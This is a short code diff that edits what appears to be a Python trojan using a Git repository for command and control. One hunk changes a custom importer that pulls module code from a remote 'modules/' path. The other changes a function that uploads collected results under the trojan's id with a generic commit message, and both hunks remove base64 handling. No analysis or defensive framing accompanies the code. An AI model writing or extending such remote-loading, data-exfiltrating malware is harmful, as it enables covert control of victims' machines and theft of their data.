@@ -34,7 +34,7 @@ class GitImporter(object):
             new_library = get_file_contents("modules/%s" % fullname)
 
             if new_library is not None:
-                self.current_module_code = base64.b64decode(new_library)
+                self.current_module_code = new_library
                 return self
 
         return None
@@ -102,7 +102,7 @@ def store_module_result(data):
 
     remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
 
-    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
+    repo.create_file(remote_path, "Commit message", data)
 
     return
 
